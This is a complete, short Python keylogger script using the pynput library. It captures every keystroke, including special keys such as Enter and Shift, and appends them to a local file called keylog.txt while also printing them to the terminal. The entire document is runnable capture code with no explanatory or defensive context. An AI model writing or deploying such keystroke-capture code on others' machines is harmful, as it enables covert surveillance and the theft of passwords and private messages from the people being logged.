from pynput import keyboard

def on_key_press(key):
    try:
        # Try to get character key
        log = key.char
    except AttributeError:
        # Special keys (like enter, shift, etc.)
        log = f'[{key.name}]'
    
    print(log)  # Optional: show in terminal
    with open("keylog.txt", "a") as file:
        file.write(log)

if __name__ == "__main__":
    print("Keylogger started... Press keys, check keylog.txt for output.")
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    input("Press Enter to stop...\n")
